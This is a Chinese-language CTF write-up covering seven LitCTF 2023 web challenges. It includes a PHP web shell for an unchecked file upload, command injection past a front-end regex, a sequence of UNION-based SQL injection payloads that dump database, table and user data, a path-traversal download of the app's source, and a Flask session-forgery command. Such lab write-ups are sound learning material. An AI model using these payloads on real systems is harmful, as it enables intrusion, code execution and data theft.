# 1、\[LitCTF 2023\] 1zjs
---
- 善用搜索，搜 flag 搜不到，可以搜搜 php。
- 本题使用了 JSFuck 编码加密。

# 2、\[LitCTF 2023\] Http pro max plus
---
- 根据提示，直接想到用 xff，结果被嘲讽了......
- 后来了解到还可以通 Client Ip 来指定发送请求的客户端 IP，于是又收到提示请求要来自 `pornhub.com`，那就要用 Referer 了。
- 但是 P 站访问不开代理怎么行呢，所以要用 via 来指定代理。
```
"Client-Ip": "127.0.0.1",
"User-Agent": "Chrome"
"Referer": "pornhub.com",
"via": "Clash.win"
```

# 3、\[LitCTF 2023\] 作业管理系统
---
- 本题是结合了弱口令以及文件上传注入两种攻击方式的考察，比较综合，有意思。
- 由于网站对上传的文件类型没有校验和限制，存在漏洞，我们就可以利用这一点。
```php
<?php
	system(%_POST["cmd"]);
?>
```

# 4、\[LitCTF 2023\] Flag点击就送！
---
- 本题也很有意思，耗费了大量时间。这题打开控制台，直接就想到了要在 cookie 上动手脚。
- 但是，尝试过修改请求头的内容无效后陷入了僵局。
- 后来学会通过 Wappalyaer 来查看整个网页的技术框架，并且发现了该网站是用 flask 搭建的，那么经过之前对 session 的解码、推测，session 被 flask 加密了。
- 所以，就要使用到 flask session 伪造工具来伪造 session，然而，我们并不知道 flask 服务的 Secret Key 是什么（重要的参数），那么我们也就不能伪造出 session 了。
- 又陷入僵局，经过搜索之后，发现可以**合理猜测**密钥是“`LitCTF`”，于是补上这个重要参数，自然就成功伪造 session 并拿到 flag 了。

# 5、\[LitCTF 2023\] Ping
---
- 本题在前端使用了 javascript 代码，以及正则表达式来防止恶意代码注入。（代码如下）
```javascript
function check_ip(){
  let ip = document.getElementById('command').value;
  let re = /^(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)$/;

  if(re.test(ip.trim())){
    return true;
  }
  alert('敢于尝试已经是很厉害了，如果是这样的话，就只能输入ip哦');
  return false;
}
```
- 解法有两种，第一种是**针对前端的保护**，只要禁用前端的 javascript 代码就可以进行命令的注入，如使用“`;`”，“`|`”等来间隔命令，并在服务端中执行。
- 而第二种则是涉及脚本的编写，以及**数据的转换或加密**，比较高级。

#  6、\[LitCTF 2023\]这是什么？SQL ！注一下！
---
- 首先根据展示出来的 php 代码可知，本题可以进行 SQL 注入。

- 首先爆破它的数据库（查询它的所有库）。
```SQL
-1)))))) union select schema_name,2 from information_schema.schemata-- 
```
- 再爆破数据库 ctf。
```SQL
-- 查看当前数据库，发现是ctf库，根据题目前面代码传递参数password=2
?id=-1)))))) union select database(),2-- 

-- 查询该库中的所有表名
?id=-1)))))) union select group_concat(table_name),2 from information_schema.tables where table_schema='ctf'-- 

-- 查询users表中的字段名
?id=-1)))))) union select group_concat(column_name),2 from information_schema.columns where table_name='users' and table_schema='ctf'-- 

-- 查询users表中数据
?id=-1)))))) union select group_concat(id,0x7e,username,0x7e,password),2 from users-- 
```
- 最后再爆破数据库 ctftraining。
```SQL
-- 查询ctftraining库中的所有表名
?id=-1)))))) union select group_concat(table_name),2 from information_schema.tables where table_schema='ctftraining'-- 

-- 查询flag表中的字段名
?id=-1)))))) union select group_concat(column_name),2 from information_schema.columns where table_name='flag' and table_schema='ctftraining'-- 

-- 查询ctftraining库中flag表中数据
?id=-1)))))) union select flag,2 from ctftraining.flag-- 
```
- **注：这个 payload 写到这里我才发现，结尾为什么要加两个 `-` 还要加个空格，原来是为了将后面的 `)` 注释掉，让服务端执行命令时忽略后面的括号。**
- 我是真的难绷！！！

# 7、抽老婆
---
- 通过查看网页源代码可知，用 GET 传递 `/download?file=xxx` 可以下载文件，当然直接下载 flag.txt 是不行的，在尝试过后，网站出现报错。
- 查看报错，发现网站好像是用 python 搭的，那就应该用到了 flask 框架，再加上看到熟悉的 session，我猜到了应该是要伪造 session 了。
- 保险起见，可以下载源码来看看。
```
https://xxx/download?file=/../../app.py
```
- 得到以下代码：
```python
from flask import *
import os
import random
from flag import flag
  
#初始化全局变量
app = Flask(__name__)
app.config['SECRET_KEY'] = 'tanji_is_A_boy_Yooooooooooooooooooooo!' 


@app.route('/', methods=['GET'])
def index():  
    return render_template('index.html')  


@app.route('/getwifi', methods=['GET'])
def getwifi():
    session['isadmin']=False
    wifi=random.choice(os.listdir('static/img'))
    session['current_wifi']=wifi
    return render_template('getwifi.html',wifi=wifi)


@app.route('/download', methods=['GET'])
def source():
    filename=request.args.get('file')
    if 'flag' in filename:
        return jsonify({"msg":"你想干什么？"})
    else:
        return send_file('static/img/'+filename,as_attachment=True)


@app.route('/secret_path_U_never_know',methods=['GET'])
def getflag():
    if session['isadmin']:
        return jsonify({"msg":flag})
    else:
        return jsonify({"msg":"你怎么知道这个路径的？不过还好我有身份验证"})


if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80,debug=True)
```
- 在源代码中 secret key 也给了出来，那就直接开始伪造吧。
```bash
python3 flask-session-cookie-manager3.py encode -s "Sercret_Key" -t "{'current_wifi': 'c1c437b721d6dcc27ccf4cb8412bd5b6.jpg', 'isadmin': True}"
```
- 修改完 cookie 之后，再去访问源代码中的特定路径，就能得到 Flag 了。